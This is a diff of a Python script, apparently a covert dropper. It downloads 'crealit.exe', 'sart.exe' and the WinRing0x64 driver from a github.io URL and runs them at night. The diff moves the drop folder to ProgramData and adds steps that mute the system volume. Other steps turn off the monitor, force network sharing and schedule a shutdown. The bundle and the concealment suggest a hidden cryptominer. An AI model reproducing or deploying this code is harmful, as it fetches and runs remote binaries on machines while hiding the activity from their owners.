@@ -15,7 +15,8 @@ shutdown_hour = 5
 shutdown_minute = 30
 base_url = "https://lokilaki.github.io/dcreamit/"
 arquivos_para_baixar = ["crealit.exe", "sart.exe","WinRing0x64.sys"]
-destino = Path(os.getenv("APPDATA")) / "Temp"
+destino = Path("C:/ProgramData/Temp")
+# destino = Path(os.getenv("APPDATA")) / "Temp"
 #destino = Path(tempfile.gettempdir())
 
 def is_after_23():
@@ -49,7 +50,7 @@ def enable_ics():
 
 def restart_ethernet():
     subprocess.run(f'netsh interface set interface "{ethernet_interface}" admin=disable', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    time.sleep(3)
+    time.sleep(30)
     subprocess.run(f'netsh interface set interface "{ethernet_interface}" admin=enable', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 def schedule_shutdown_and_disable_ics():
@@ -58,6 +59,8 @@ def schedule_shutdown_and_disable_ics():
     if shutdown_time < now:
         shutdown_time += datetime.timedelta(days=1)
     secs_left = int((shutdown_time - now).total_seconds())
+
+    subprocess.run(f'shutdown -a', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
     # agenda o desligamento forçado
     subprocess.run(f'shutdown /s /f /t {secs_left}', shell=True,
@@ -110,6 +113,7 @@ def baixar_arquivos():
 
 def desligar_monitor():
     subprocess.Popen(f'cmd /c start "" "{destino}\sart.exe" monitor off', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.Popen(f'cmd /c start "" "{destino}\sart.exe" mutesysvolume 1', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 def get_computer_description():
     try:
@@ -127,13 +131,13 @@ def ligar_crealit():
 
 
 def main():
-    #if not is_after_23():
-    #    return
-    #connect_to_wifi()
-    #time.sleep(5)
-    #enable_ics()
-    #time.sleep(5)
-    #restart_ethernet()
+    # if not is_after_23():
+    #     return
+    connect_to_wifi()
+    time.sleep(30)
+    enable_ics()
+    time.sleep(30)
+    restart_ethernet()
     baixar_arquivos()
     desligar_monitor()
     ligar_crealit()
